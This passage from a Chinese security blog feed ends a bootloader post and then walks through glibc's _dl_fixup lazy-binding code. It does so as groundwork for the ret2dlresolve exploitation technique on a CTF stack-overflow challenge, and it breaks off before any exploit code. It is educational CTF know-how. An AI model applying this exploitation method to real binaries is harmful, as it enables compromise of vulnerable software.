class="line"></span><br></pre></td></tr></table></figure></div>
<p>之后就是需要链接编译程序后执行，使用到的makefile如下。其中最重要的部分是最后生成软盘这个输出目标。用的是dd指令，首先创建了一个空的软盘，然后往第一扇区写入boot.bin，长度为一个扇区；往第二扇区写入stage2.bin，长度为两个扇区；往第四扇区写入kernel.bin，长度为5个扇区。那么之前调用0x13中断从软盘映射到内存的一些参数就可以填进去了。其中run的伪目标开的-s和-S是用来调试的，在本地起1234端口提供调试服务。如果开了-S，qemu会在一开始进去时就卡住等待调试。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">DIR := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINK_LD := <span class="variable">$(DIR)</span>/linker.ld</span><br><span class="line">TARGET := <span class="variable">$(DIR)</span>/focus-os.img</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: all clean run</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">boot.bin: boot.asm</span></span><br><span class="line">	nasm -f bin boot.asm -o boot.bin</span><br><span class="line"></span><br><span class="line"><span class="section">stage2.bin: stage2.asm</span></span><br><span class="line">	nasm -f bin stage2.asm -o stage2.bin</span><br><span class="line"></span><br><span class="line"><span class="section">kernel.o: kernel.c</span></span><br><span class="line">	gcc -m32 -g -ffreestanding -c kernel.c -o kernel.o</span><br><span class="line"></span><br><span class="line"><span class="section">kernel.bin: kernel.o linker.ld</span></span><br><span class="line">	ld -m elf_i386 -g -T <span class="variable">$(LINK_LD)</span> -o kernel.elf kernel.o</span><br><span class="line">	objcopy -O binary kernel.elf kernel.bin</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: boot.bin kernel.bin stage2.bin</span><br><span class="line">	dd if=/dev/zero of=<span class="variable">$(TARGET)</span> bs=512 count=2880                    </span><br><span class="line">	dd if=boot.bin of=<span class="variable">$(TARGET)</span> bs=512 count=1 conv=notrunc           </span><br><span class="line">	dd if=stage2.bin of=<span class="variable">$(TARGET)</span> bs=512 count=2 seek=1 conv=notrunc  </span><br><span class="line">	dd if=kernel.bin of=<span class="variable">$(TARGET)</span> bs=512 count=5 seek=3 conv=notrunc          </span><br><span class="line"></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	qemu-system-i386 -fda <span class="variable">$(TARGET)</span>  -s -S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.bin *.o *.elf <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后就可以跑通在屏幕上显示我们的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250429153050724.png"
                      class=""
                >
<h3 id="参考资料">参考资料</h3>
<p>https://cloud.tencent.com/developer/ask/sof/112517341</p>
<p>https://www.cnblogs.com/jiangbo4444/p/17079748.html</p>
<p>https://wiki.osdev.org/Bootloader</p>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解ret2dlresolve</title>
    <url>/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/</url>
    <content><![CDATA[<p>在一开始打pwn时我们就接触过<strong>plt</strong>表和<strong>got</strong>表这两个用来动态加载libc函数的重要部分，不过当时我对其理解只限于got表在经过一次调用函数后，里面存着的就是libc中的具体函数指针；而plt表则是我们调用一个函数时事先跳转到的地方，其会跳转到对应got表位置处存的地址。现在我们来学一下是经过了一个什么过程才把真正的函数指针填到got表中，并深入分析一下哪里存在可以利用的点。</p>
<p>其中我们在IDA中看到的<strong>.got.plt</strong>段就是我们俗称的<strong>got</strong>表：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205232833.png"
                      class=""
                >
<p>而<strong>.plt</strong>段则存着<strong>plt</strong>表，其中每个函数的plt都有两个<strong>jmp</strong>，我们调用所有函数都是来到第一个jmp处，然后跳转到对应got表位置存的地址处。在一个函数都还没被调用时，got表里存的就是对应同一个函数的plt表里的第二个jmp前push的地址。所以实际上第一次调用某个函数是由第二个jmp跳转到后续的解析函数（这里是0x400500）。这里看到前面push的数字正好是按照函数在plt中的顺序递增的。而<strong>0x400500</strong>处也是push一个地址并跳转到另一个地址处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601205327472.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210040967.png"
                      class=""
                >
<p>在gdb调试中，我们可以看到最后会跳转到**_dl_runtime_resolve_xsavec-&gt;_dl_fixup<strong>函数链进行解析。进</strong>dl_fixup<strong>时的两个参数就是之前push到栈上的序号以及一个libc里的地址（</strong>link_map**地址）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601210240496.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601212109244.png"
                      class=""
                >
<p>我们可以定位到2.27glibc源码进行查看，**_dl_runtime_resolve<strong>位置在</strong>sysdeps/x86_64/dl-trampline.h<strong>中。而</strong>_dl_fixup<strong>在</strong>elf/dl-runtime.c<strong>中。这里我们主要看</strong>_dl_fixup**实现。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="dl_fixup处理过程">dl_fixup处理过程</h3>
<p>我们一步一步来分析具体做了什么。首先看一下传进来的参数是什么。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>l</code> 是调用者所在的
<code>link_map</code>，记录该动态库或可执行文件的加载信息。</li>
<li><code>reloc_arg</code> 是重定位槽编号（PLT entry
编号），用于查找具体哪个函数需要绑定。</li>
</ul>
<p>然后看看<strong>link_map</strong>是一个什么样的结构</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ElfW(Addr) l_addr;   <span class="comment">// 当前对象在内存中实际加载地址与它的ELF文件中指定地址的差值（即重定位偏移）</span></span><br><span class="line">  <span class="type">char</span> *l_name;        <span class="comment">// 当前共享对象的文件名（绝对路径）</span></span><br><span class="line">  ElfW(Dyn) *l_ld;     <span class="comment">// 指向该对象的动态段（.dynamic section），里面包含了所有动态链接的信息</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">// 链表指针，指向加载链中的前一个和下一个 link_map</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>调试时看到的对应结构体远比上面的结构体定义复杂，不过前几个字段还是对的上的，发现第一个next域指的很近，实际使两个link_map重叠了。我们可以跟着next域打印几个<strong>link_map</strong>链表结点看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601215505916.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220205529.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220301045.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220338216.png"
                      class=""
                >
<p>看的出来<strong>link_map</strong>串联起了多个动态链接库。</p>
<p><code>ElfW(type)</code> 是用于处理 <strong>32位与64位 ELF
兼容性</strong> 的一个 GNU-style
宏技巧，它可以根据目标架构自动选择正确的类型。</p>
<p>先看这些宏的定义顺序：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW_1(e,w,t)    e##w##t</span></span><br></pre></td></tr></table></figure></div>
<p>再看变量 <code>__ELF_NATIVE_CLASS</code> 的含义：</p>
<ul>
<li><code>__ELF_NATIVE_CLASS</code> 在 32 位系统上为
<code>32</code></li>
<li>在 64 位系统上为 <code>64</code></li>
</ul>
<p>所以：</p>
<p>比如 <code>ElfW(Addr)</code> 会被展开为如下过程（以 64 位为例）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr)</span><br><span class="line">-&gt; _ElfW(Elf, <span class="number">64</span>, Addr)</span><br><span class="line">-&gt; _ElfW_1(Elf, <span class="number">64</span>, _Addr)</span><br><span class="line">-&gt; Elf64_Addr</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>宏调用</th>
<th>展开结果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ElfW(Addr)</code></td>
<td><code>Elf32_Addr</code>（32位）或
<code>Elf64_Addr</code>（64位）</td>
</tr>
<tr>
<td><code>ElfW(Sym)</code></td>
<td><code>Elf64_Sym</code></td>
</tr>
<tr>
<td><code>ElfW(Dyn)</code></td>
<td><code>Elf64_Dyn</code></td>
</tr>
<tr>
<td><code>ElfW(Half)</code></td>
<td><code>Elf64_Half</code></td>
</tr>
</tbody>
</table>
<p>而在<strong>elf/elf.h</strong>中，我们就可以看到<strong>Elf64_Addr</strong>实际就是一个64位的无符号整型。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214457631.png"
                      class=""
                >
<p>Dyn的这个结构体占16字节</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214706199.png"
                      class=""
                >
<h4 id="获取符号表与字符串表">1. 获取符号表与字符串表</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>symtab</code>：符号表指针，保存函数名和地址等信息。</li>
<li><code>strtab</code>：字符串表指针，保存符号名字符串（比如
<code>"printf"</code>）。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223442507.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223513590.png"
                      class=""
                >
<h4 id="获取当前重定位项">2. 获取当前重定位项</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>DT_JMPREL</code>：保存 <code>.rel.plt</code> 表的位置；</li>
<li><code>reloc_offset</code> 是根据 <code>reloc_arg</code>
算出来的；</li>
<li><code>reloc</code>：指向当前 PLT 的重定位项。</li>
</ul>
<p>从上图也可以看到通过基址加偏移的方式计算出了<strong>read
got</strong>的重定位表项地址</p>
<h4 id="获取符号项和地址">3. 获取符号项和地址</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>reloc-&gt;r_info</code> 里面编码了符号索引；</li>
<li><code>sym</code> 是要绑定的符号（比如 <code>printf</code>）；</li>
<li><code>rel_addr</code> 是 GOT
中的地址，即我们需要写入“真正函数地址”的地方。</li>
</ul>
<h4 id="断言必须是-plt-重定位">4. 断言：必须是 PLT 重定位</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>只处理 <code>JMP_SLOT</code> 类型（即跳转槽），其他如
<code>RELATIVE</code> 等不由 <code>_dl_fixup</code> 处理。</li>
</ul>
<h4 id="判断符号是否可见并查找真实地址">5.
判断符号是否可见并查找真实地址</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ELFW(ST_VISIBILITY) (sym-&gt;st_other) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>如果符号是默认可见（即不是 hidden），则进行全局符号查找：</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查找流程包括版本信息、作用域锁等；</li>
<li><code>result</code> 是找到该符号所在的 <code>link_map</code>；</li>
<li><code>sym-&gt;st_value</code> 是符号在该库内的偏移，加上
<code>result</code> 的基地址就是最终地址。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601224334477.png"
                      class=""
                >
<p>执行完后rax为<strong>0x7ffff7ff4000</strong>，刚好是之前<strong>libc.so.6</strong>那个<strong>link_map</strong>的地址。</p>
<h4 id="查询出具体函数的地址">6. 查询出具体函数的地址</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOOKUP_VALUE_ADDRESS(map) ((map) ? (map)-&gt;l_addr : 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<p>如果 <code>sym</code> 存在，就计算：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">value = l_addr + sym-&gt;st_value;</span><br></pre></td></tr></table></figure></div>
<p>这里的l_addr是libc在库中的偏移，也就是说这个是<strong>libc_base</strong>，那么<strong>value</strong>也就是：符号的真实内存地址</p>
<p>否则：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE(result, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<p>即符号未找到，回传 0。</p>
<p>从pwndbg中可以很清楚看到read函数的实际地址已经被计算出来了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601225909654.png"
                      class=""
                >
<h4 id="修正值考虑架构的特殊处理">7. 修正值：考虑架构的特殊处理</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> elf_machine_plt_value(map, reloc, value) (value)</span></span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>某些架构需要对地址进行调整（如加偏移、修正格式）；</li>
</ul>
<h4 id="ifunc-处理间接函数">8. IFUNC 处理（间接函数）</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (sym &amp;&amp; STT_GNU_IFUNC) &#123;</span><br><span class="line">    value = elf_ifunc_invoke(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>如果符号类型是
<code>GNU_IFUNC</code>（间接函数），则先调用解析函数获得真实地址。</li>
</ul>
<h4 id="写回-got-表用于后续直接跳转">9. 写回 GOT
表（用于后续直接跳转）</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt(l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">elf_machine_fixup_plt (<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span><br><span class="line">		       <span class="type">const</span> ElfW(Sym) *refsym, <span class="type">const</span> ElfW(Sym) *sym,</span><br><span class="line">		       <span class="type">const</span> ElfW(Rela) *reloc,</span><br><span class="line">		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>dl_bind_not</code>
表示是否跳过写回（某些情况会保留懒绑定）；</li>
<li>否则会调用 <code>elf_machine_fixup_plt()</code> 把
<code>value</code> 写入 <code>GOT</code> 中的
<code>rel_addr</code>，完成绑定；</li>
<li>返回 <code>value</code> 给调用方继续执行。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601230147175.png"
                      class=""
                >
<h3 id="ret2dlresolve利用手法">ret2dlresolve利用手法</h3>
<p>该手法适用于没有 libc 泄露或 info
leak的情况，但有栈溢出、有任意可控内存写，且已知 <code>plt</code>,
<code>got</code>, <code>rel.plt</code>
等节区偏移。本节我们以<strong>2015-xdctf-pwn200</strong>这个例题来学习这一手法。题目漏洞很明显，一个裸的栈溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234751736.png"
                      class=""
                >
<p>题目里没啥别的控制rdx的gadget，这里可以用ret2csu。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234933802.png"
                      class=""
                >
<p>三种 RELRO
模式对比如下，我们在不同的保护模式下利用方式也有所区别，在<strong>Full
RELRO</strong>下该利用手法就失效了。</p>
<table>
<colgroup>
<col style="width: 22%" />
<col style="width: 22%" />
<col style="width: 10%" />
<col style="width: 44%" />
</colgroup>
<thead>
<tr>
<th>RELRO 类型</th>
<th><code>.got.plt</code> 可写性</th>
<th>攻击难度</th>
<th>是否启用 lazy binding（延迟绑定）</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>No RELRO</strong></td>
<td>可写</td>
<td>最低</td>
<td>开启</td>
</tr>
<tr>
<td><strong>Partial RELRO</strong></td>
<td><code>.got.plt</code> 可写</td>
<td>中等</td>
<td>开启</td>
</tr>
<tr>
<td><strong>Full RELRO</strong></td>
<td><code>.got.plt</code> 也只读</td>
<td>最高</td>
<td>禁用（立即绑定）</td>
</tr>
</tbody>
</table>
<p>由于寻找libc基址是通过<strong>strtab +
sym-&gt;st_name</strong>这个函数的名字来查找的</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
<h4 id="no-relro-64"><strong>No RELRO-64</strong></h4>
<p>在<strong>DYNAMIC</strong>节中就存着<strong>DT_STRTAB</strong>和<strong>DT_SYMTAB</strong>，分别指向字符名表和符号表。而这个DYNAMIC节在<strong>No
